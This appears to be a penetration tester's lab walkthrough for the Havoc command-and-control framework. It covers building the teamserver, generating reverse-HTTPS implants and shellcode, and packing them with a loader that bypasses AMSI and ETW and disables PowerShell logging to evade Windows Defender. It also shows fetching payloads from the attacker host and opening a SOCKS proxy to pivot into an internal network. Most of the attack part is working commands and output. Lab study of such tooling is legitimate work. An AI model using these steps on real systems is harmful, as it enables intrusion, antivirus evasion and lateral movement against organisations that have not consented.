=======================================================================================================================================
Pivoting with the HAVOC C2 Framework
=======================================================================================================================================

HAVOC is a modern and malleable post-exploitation command and control framework.

=> https://github.com/HavocFramework/Havoc
=> https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD
=> https://4pfsec.com/havoc-c2-first-look/
=> https://payload.cafe/2022/10/02/havoc-c2-intro-inline-csharp-compilation-within-powershell/

Context
========
During during penetration tests, Command and Control solutions (C2) like the Havoc framework can be used to create a reverse tunnel between a target Windows/Linux server or a Windows laptop located inside a company internal network and an Internet-facing remote server belonging to the pentesters (e.g. a Kali VM running in AWS or Azure).
Creating a reverse tunnel is usefull to pass trhough firewalls and to pivot inside a company's internal network after having compromise for example a vulnerable internet-facing website (e.g. unpatched RCE flaws) or a laptop via a phishing attack.

Basic test lab
===============
> Kali Linux (192.168.56.104)
> Windows 10 Laptop with Defender AV enabled and up-to-date (192.168.1.113)
> Windows 2016 server with Defender AV enabled and up-to-date (192.168.1.51)
> Windows DC 2016 with Defender AV enabled and up-to-date (192.168.1.167)

The Kali Linux box can't reach the network 192.168.1.0/24. 
To be able to reach the machines located in the network 192.168.1.0/24 we will start a Havoc implant (reverse HTTPS shell with a proxy socks) 
on the Windows 10 laptop to pivot and then attack the machines located in the network 192.168.1.0/24.


Miscellaneous notes
====================



=====================================================================================================================
PoC - Step 1 - Install the HAVOC C2 framework on the Kali Linux box
=====================================================================================================================

1. Instal prerequisites packages
---------------------------------
jeff@kali:~/Documents/Tools/HavocC2> sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm

2. Set up the bookworm repo for Python 3.10
--------------------------------------------
jeff@kali:~/Documents/Tools/HavocC2> echo 'deb http://ftp.de.debian.org/debian bookworm main' >> /etc/apt/sources.list
sudo apt update
sudo apt install python3-dev python3.10-dev libpython3.10 libpython3.10-dev python3.10

3. Building the HAVOC Client
-----------------------------

jeff@kali:~/Documents/Tools/HavocC2> git clone https://github.com/HavocFramework/Havoc.git
jeff@kali:~/Documents/Tools/HavocC2> cd Havoc/Client
jeff@kali:~/Documents/Tools/HavocC2/Havoc/Client/> make 

jeff@kali:~/Documents/Tools/HavocC2/Havoc/Client$ ./Havoc
qt.qpa.xcb: could not connect to display
qt.qpa.plugin: Could not load the Qt platform plugin "xcb" in "" even though it was found.
This application failed to start because no Qt platform plugin could be initialized. Reinstalling the application may fix this problem.
Available platform plugins are: eglfs, linuxfb, minimal, minimalegl, offscreen, vnc, xcb.
Aborted

jeff@kali:~/Documents/Tools/HavocC2/Havoc/Client$ export QT_QPA_PLATFORM=offscreen

jeff@kali:~/Documents/Tools/HavocC2/Havoc/Client$ ./Havoc
[00:05:59] [info] Havoc Framework [Version: 0.4.1] [CodeName: The Fool]

4. Building the HAVOC Teamserver
--------------------------------

jeff@kali:~/Documents/Tools/HavocC2> cd Havoc/Teamserver
jeff@kali:~/Documents/Tools/HavocC2/Havoc/Teamserver> go mod download golang.org/x/sys  
jeff@kali:~/Documents/Tools/HavocC2/Havoc/Teamserver>go mod download github.com/ugorji/go

jeff@kali:~/Documents/Tools/HavocC2/Havoc/Teamserver$ ./teamserver 
              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \                                                                                                          
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/                                                                                                          
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │                                                                                                                
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │                                                                                                                
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │                                                                                                                
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\                                                                                                          
    │/     \││/     \│   \_/   (_______)(_______/                                                                                                          

         pwn and elevate until it's done

Havoc Teamserver

Usage:
  teamserver [flags]
  teamserver [command]

Available Commands:
  help        Help about any command
  server      server command

Flags:
  -h, --help   help for teamserver

Use "teamserver [command] --help" for more information about a command.


=====================================================================================================================
PoC - Step 2 - Create an operator and start the HAVOC teamserver and on the Kali Linux box
=====================================================================================================================

1. Creation of the new-operator 'jeff' 
---------------------------------------

jeff@kali:~/Documents/Tools/HavocC2/Havoc/Teamserver$ gedit ./profiles/jeff-havoc-profile.yaotl
Teamserver {
        Host = "0.0.0.0"
        Port = 40056
        Build {
            Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
            Nasm = "/usr/bin/nasm"
        }
}
Operators {
        user "Jeff" {
                Password = "<snip>"
        }
}
Demon {
    Sleep = 2

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

2. Starting the HAVOC teamserver with the jeff profile
-------------------------------------------------------

jeff@kali:~/Documents/Tools/HavocC2/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/jeff-havoc-profile.yaotl -v --debug
[sudo] password for jeff:
              _______           _______  _______
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
    │/     \││/     \│   \_/   (_______)(_______/

         pwn and elevate until it's done

[00:28:28] [DBUG] [cmd.serverFunc:70]: Debug mode enabled
[00:28:28] [INFO] Havoc Framework [Version: 0.4.1] [CodeName: The Fool]
[00:28:28] [INFO] Havoc profile: ./profiles/jeff-havoc-profile.yaotl
[00:28:28] [INFO] Build:
 - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
 - Compiler x86 : /usr/bin/i686-w64-mingw32-gcc
 - Nasm         : /usr/bin/nasm
[00:28:28] [INFO] Time: 16/01/2023 00:28:28
[00:28:28] [INFO] Teamserver logs saved under: data/loot/16.01.2023_00:28:28
[00:28:28] [DBUG] [teamserver.(*Teamserver).Start:47]: Starting teamserver...
[00:28:28] [INFO] Starting Teamserver on ws://0.0.0.0:40056
[00:28:28] [INFO] Opens existing database: data/havoc.db
[00:28:28] [DBUG] [teamserver.(*Teamserver).Start:409]: Wait til the server shutdown


3. Join the HAVOC C2 server as 'jeff' with the HAVOC client
------------------------------------------------------------

jeff@kali:~/Documents/Tools/HavocC2/Havoc/Client$ ./Havoc 
Qt: Session management error: Authentication Rejected, reason : None of the authentication protocols specified are supported and host-based authentication failed
[00:33:41] [info] Havoc Framework [Version: 0.4.1] [CodeName: The Fool]
[00:34:42] [error] Couldn't check if DemonClass is ready
[00:34:42] [error] Couldn't check if AgentClass is ready
[00:34:42] [error] Couldn't check if Event class is ready
<SNIP>

Connect box settings
--------------------
> Name: Test
> Host: 127.0.0.1
> Port: 40056
> Name: Jeff
> Password: <snip>

In the Havoc Teamserver logs
-----------------------------
[00:34:42] [DBUG] [teamserver.(*Teamserver).ClientAuthenticate:552]: Found User: Jeff
[00:34:42] [DBUG] [teamserver.(*Teamserver).ClientAuthenticate:566]: User Jeff is authenticated
[00:34:42] [GOOD] User <Jeff> Authenticated


=====================================================================================================================
PoC - Step 3 - Set up a HAVOC HTTPS handler
=====================================================================================================================

To add a new HAVOC listener, go to:
=> “View” => “Listeners” => “Add” (at the bottom of the window) => "Save" (at the bottom of the window)

> Name: Test
> Payload: Https
> Host Rotation: round-robin
> Host (Bind): 192.168.56.104
> Port: 443
> User Agents: Mozilla/5.0 <snip>
> Enable Proxy connection: Off 


=====================================================================================================================
PoC - Step 4 - Generate a HAVOC implant (reverse HTTPS payload)
=====================================================================================================================

--------------------------------------
Example 1 - HAVOC - Windows Exe file
--------------------------------------
To generate a new payload, click on “Attack” => “Payload“ => "Generate" (at the bottom of the window)
By default HAVOC implant/demon are encrypted with the AES symmetric encryption protocol.

Agent: Demon
Options
 > Listener: Test
 > Arch: x64
 > Format: Windows Exe  (Choose between "Exe", "Dll", "Shellcode", "Servcie Exe")
Config
 > Sleep: 2                                        //The default interval to sleep between check-ins for commands.
 > Indirect Syscall: Enabled
 > Sleep Technique: WaitForSIngleObjectEx          //Choose between: "WaitForSIngleObjectEx" (no obfuscation), "Ekko" and "Foliage"
 > Injection
   > Alloc: Native/Syscall
   > Execute: Native/Syscall
   > Spawn64: C:\Windows\System32\notepad.exe      //The full path to the process to spawn into for fork & run operations (64bit).
   > Spawn32: C:\Windows\Syswow64\notepad.exe      //The full path to the process to spawn into for fork & run operations (32bit).

Building Console
[*] Starting build
[*] Use indirect syscalls
[*] Config size [412 bytes]
[*] Compiling source
[*] Finished compiling source
[+] Payload generated

Payload saved under: /home/jeff/Documents/Tools/HavocC2/Havocdemon.exe


--------------------------------------
Example 2 - HAVOC - Windows Shellcode 
--------------------------------------
To generate a new payload, click on “Attack” => “Payload“ => "Generate" (at the bottom of the window)

Agent: Demon
Options
 > Listener: Test
 > Arch: x64
 > Format: Windows Shellcode
Config
 > Sleep: 2                                        //The default interval to sleep between check-ins for commands.
 > Indirect Syscall: Enabled
 > Sleep Technique: WaitForSIngleObjectEx          //Choose between: "WaitForSIngleObjectEx" (no obfuscation), "Ekko" and "Foliage"
 > Injection
   > Alloc: Native/Syscall
   > Execute: Native/Syscall
   > Spawn64: C:\Windows\System32\notepad.exe      //The full path to the process to spawn into for fork & run operations (64bit).
   > Spawn32: C:\Windows\Syswow64\notepad.exe      //The full path to the process to spawn into for fork & run operations (32bit).

Building Console
[*] Starting build
[*] Use indirect syscalls
[*] Config size [376 bytes]
[*] Compiling core dll...
[*] Compiled core dll [65536 bytes]
[*] Shellcode payload [66559 bytes]
[+] Payload generated

Payload saved under: /home/jeff/Documents/Tools/HavocC2/HavocShellcode.exe

Preparing the shellcode in the format "PS1" to be able to use my shellcode loader generator tools
=> https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/PowerShellTools

Step 1 - Format the shellcode using xxd and sed
-------
=> jeff@kali:~/Documents/Tools/HavocC2$ xxd -p HavocShellcode.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > HavocShellcodeps1.bin

Step 2: Remove the tailing comma “,” at the end of the payload 
-------
Step 3: Add "[Byte[]] $buf =" at the beginning of the shellcode
-------

jeff@kali:~/Documents/Tools/HavocC2$ cat HavocShellcodeps1.bin

[Byte[]] $buf = 0x56,0x48,0x89,0xe6,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x0f,0x00,0x00,0x00,0x48,0x89,0xf4,<SNIP>


====================================================================================================================================================
PoC - Step 5 - Generate a packed version of the HAVOC implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
====================================================================================================================================================

------------------------------------------
Example 1 - HAVOC - Windows Exe file
------------------------------------------
The HAVOC demaons/implants generated with the Windows format ".exe" are easily detected by AV solution such as WIndows Defender. 
However, multiple tools can be used to "pack/obfuscate/encrypt" the HAVOC implants (Please refer to: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)) 

PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 15/01/2023 13:05:26

PS C:\Users\Administrator\Downloads> wget -URI http://192.168.56.104:8080/PackedHavocRevShell.exe -OutFile PackedHavocRevShell.exe

PS C:\Users\Administrator\Downloads> .\PackedHavocRevShell.exe


------------------------------------------
Example 2 - HAVOC - Windows Shellcode 
------------------------------------------

PS C:\temp> Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
  ___     ___ _  _     ___ _        _ _  ___         _     _                _        ___
 | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ __|_  |
 |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _/ /
 |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|/___|
                                                                                         v1.0
Usage:
> Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
> Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellCode -TargetProcess explorer -OutFile C:\path\Packed-ShellCodeLoader.ps1
> Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellCode -TargetProcess explorer -OutFile C:\path\Packed-ShellCodeLoader.ps1

Features:
[*] Reflective shellcode loading into the memory of a target process
[*] AES encryption and GZip compression
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging

PS C:\temp>

PS C:\temp> Invoke-PoSH-ShellCodeLoader2 -Filepath C:\Users\Administrator\Downloads\HavocShellcodeps1.bin -TargetProcess explorer -OutFile C:\temp\PackedHavocShellcode.ps1
[*] Loading the local file: 'C:\Users\Administrator\Downloads\HavocShellcodeps1.bin
[*] Creating the Shellcode loader script
[*] File compression (GZip)
[*] File encryption (AES)
[*] Adding 'A'M'S'I' bypass
[*] Adding 'E'T'W' bypass
[*] Disabling PoSh history logging
[*] The obfuscated & encrypted shellcode loader script has been saved: 'C:\temp\PackedHavocShellcode.ps1' ...
[+] Done!


========== OR ==============

PS C:\temp> Invoke-PoSH-ShellCodeLoader2 -FileUrl http://192.168.56.104:8080/HavocShellcodeps1.bin -TargetProcess explorer -OutFile C:\temp\PackedHavocShellcode.ps1
[*] Downloading the remote file: 'http://192.168.56.104:8080/HavocShellcodeps1.bin'
[*] Creating the ShellCode loader script
[*] File compression (GZip)
[*] File encryption (AES)
[*] Adding 'A'M'S'I' bypass
[*] Adding 'E'T'W' bypass
[*] Disabling PoSh history logging
[*] The obfuscated & encrypted shellcode loader script has been saved: 'C:\temp\PackedHavocShellcode.ps1' ...
[+] Done!

PS C:\temp> . .\PackedHavocShellcode.ps1

Unhandled Exception: System.AccessViolationException: Attempted to read or write protected memory. This is often an indication that other memory is corrupt.
   at CallSite.Target(Closure , CallSite , Object , Object , IntPtr , Int32 , Object , Int32 , IntPtr )
   at System.Dynamic.UpdateDelegates.UpdateAndExecute7[T0,T1,T2,T3,T4,T5,T6,TRet](CallSite site, T0 arg0, T1 arg1, T2 arg2, T3 arg3, T4 arg4, T5 arg5, T6 arg6)
   at System.Management.Automation.Interpreter.DynamicInstruction`8.Run(InterpretedFrame frame)
<SNIP>

=> An error message is displayed but the shellcode is executed without being detected by Windows Defender and the Havoc reverse shell connects back to the teamserver.


==============================================================================================================================================
PoC - Step 6 - Get the reverse shell and then configure a SOCKS proxy 4 within the HAVOC session (command "socks add")
==============================================================================================================================================

=> Once the HAVOC implant connects back to the HAVOC temaserver, you can interact with the reverse shell by cliking on "Interact".  

[16/01/2023 02:01:29] Agent 4CCD1C1E authenticated from as Laptop1\Administrator :: [Internal: 0.0.0.0] [Process: PackedHavocRevShell.exe\7344] [Arch: x64] [Pivot: Direct]

16/01/2023 02:03:31 [Jeff] Demon >> help

Demon Commands
==============

  Command            Type         Description
  -------            -------      -----------
  help               Command      Shows help message of specified command
  sleep              Command      sets the delay to sleep
  checkin            Command      request a checkin request
  job                Module       job manager
  task               Module       task manager
  proc               Module       process enumeration and management
  transfer           Command      download transfer module
  dir                Command      list specified directory
  download           Command      downloads a specified file
  upload             Command      uploads a specified file
  cd                 Command      change to specified directory
  cp                 Command      copy file from one location to another
  remove             Command      remove file or directory
  mkdir              Command      create new directory
  pwd                Command      get current directory
  cat                Command      display content of the specified file
  screenshot         Command      takes a screenshot
  shell              Command      executes cmd.exe commands and gets the output
  powershell         Command      executes powershell.exe commands and gets the output
  inline-execute     Command      executes an object file
  shellcode          Module       shellcode injection techniques
  dll                Module       dll spawn and injection modules
  exit               Command      cleanup and exit
  token              Module       token manipulation and impersonation
  dotnet             Module       execute and manage dotnet assemblies
  net                Module       network and host enumeration module
  config             Module       configure the behaviour of the demon session
  pivot              Module       pivoting module
  rportfwd           Module       reverse port forwarding
  socks              Module       socks4a proxy


  16/01/2023 02:06:23 [Jeff] Demon >> help socks

 - Command       :  socks
 - Description   :  socks4a proxy
 - Usage         :  socks [sub command] (args)
 - Example       :  socks add 4444

  Command                        Description      
  ---------                      -------------     
  add                            add a socks4a proxy
  list                           list all socks4a proxy servers
  kill                           kill and remove a socks4a proxy server
  clear                          kill and clear all socks4a proxy servers


16/01/2023 02:07:45 [Jeff] Demon >> socks add
[!] Not enough arguments for "socks add"

16/01/2023 02:07:50 [Jeff] Demon >> socks add 4444
[+] Started socks4a server on port 4444


------------------------------------------------------------------
Notes
# apt-get install proxychains
# cp /etc/proxychains.conf /etc/proxychains.conf.backup
# echo "socks4 127.0.0.1 4444" >> /etc/proxychains.conf
------------------------------------------------------------------
Configuration of Proxychains
------------------------------------------------------------------

jeff@kali:~$ tail /etc/proxychains.conf
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
# socks5  127.0.0.1 1080
socks4  127.0.0.1 4444


===================================================================================================================================================
PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the HAVOC session (socks4) to pivot into the network '192.168.1.0/24' 
===================================================================================================================================================

without using Proxychains and the HAVOC session, the network traffic is filtered towards the Windows machine '192.168.1.113' from the Kali VM 
------------------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~$ nmap -sT -Pn -p 3389 192.168.1.113
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-16 02:50 CET
Nmap scan report for 192.168.1.113
Host is up (0.000026s latency).

PORT     STATE    SERVICE
3389/tcp filtered ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds


Example 1 - Nmap port scan of the Windows machine '192.168.1.113' (from the KALI VM) over the HAVOC session
----------------------------------------------------------------------------------------------------------------

jeff@kali:~$ proxychains nmap -sT -Pn -p 3389 192.168.1.113
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-16 02:50 CET
|S-chain|-<>-127.0.0.1:4444-<><>-192.168.1.113:3389-<><>-OK
Nmap scan report for 192.168.1.113
Host is up (0.13s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
